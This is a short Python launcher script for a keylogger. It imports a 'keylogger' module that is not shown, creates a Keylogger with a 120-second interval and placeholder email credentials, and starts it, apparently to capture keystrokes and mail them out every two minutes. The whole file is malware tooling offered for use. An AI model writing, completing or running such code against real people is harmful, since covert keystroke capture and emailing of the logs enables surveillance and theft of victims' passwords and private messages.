#!/usr/bin/env python

import keylogger

if __name__ == "__main__":
    my_keylogger = keylogger.Keylogger(120, "email@gmail.com", "password")
    my_keylogger.start()
